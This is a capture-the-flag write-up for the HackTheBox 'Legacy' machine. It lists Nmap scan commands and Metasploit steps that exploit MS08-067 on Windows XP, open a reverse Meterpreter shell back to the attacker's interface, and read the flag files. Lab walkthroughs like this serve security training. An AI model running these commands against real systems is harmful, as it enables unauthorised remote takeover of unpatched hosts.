Legacy

HackTheBox, Easy

Legacy is a Windows XP host with SMB exposed and vulnerable to MS08-067 (CVE-2008-4250), a buffer overflow in the Server service that gives remote code execution as SYSTEM with no credentials at all.

Reconnaissance

Only the RPC and SMB ports are open. smb-os-discovery identifies Windows XP, and the Nmap vulnerability script confirms MS08-067.

nmap -Pn -n -sT --min-rate 1500 -p- <IP>
nmap -Pn -n -sT -sV -sC -p135,139,445 <IP>
# 445 Windows XP microsoft-ds, message signing disabled
nmap -p445 --script smb-vuln-ms08-067 <IP>
# State: VULNERABLE

Exploitation - MS08-067

The bug lives in how NetPathCanonicalize handles paths received over RPC on SMB. The Metasploit module detects the version and service pack and delivers a Meterpreter as NT AUTHORITY\SYSTEM. XP has no whoami, so getuid confirms it.

msfconsole -q
use exploit/windows/smb/ms08_067_netapi
set RHOSTS <IP>
set LHOST tun0
run
getuid
shell
type "C:\Documents and Settings\john\Desktop\user.txt"
type "C:\Documents and Settings\Administrator\Desktop\root.txt"
